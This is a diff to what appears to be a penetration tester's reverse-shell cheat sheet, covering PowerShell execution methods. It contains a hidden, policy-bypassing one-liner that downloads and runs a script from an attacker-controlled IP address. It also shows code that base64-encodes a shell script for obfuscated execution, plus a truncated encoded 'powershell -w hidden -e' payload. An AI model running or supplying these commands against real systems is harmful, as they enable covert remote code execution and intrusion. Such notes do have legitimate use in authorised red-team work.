@@ -72,16 +72,20 @@ Launch the above script directly or save on local attacking maching and call it 
 
 `powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.219.xxx/raw.ps1')"`
 
-`powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy By-Commandpass -File shell.ps1`
+`powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File shell.ps1`
 
 ### Encoded POwershell Execution
 
-```
-$expression     = Get-Content -Path .\test.ps1
+```powershell
+$expression     = Get-Content -Path .\shell_raw.ps1
 $commandBytes   = [System.Text.Encoding]::Unicode.GetBytes($expression)
 $encodedCommand = [Convert]::ToBase64String($commandBytes)
 
 Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([convert]::FromBase64String($encodedCommand)))
+
+#or 
+
+str = "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad..."
 ```
 
 ## Python
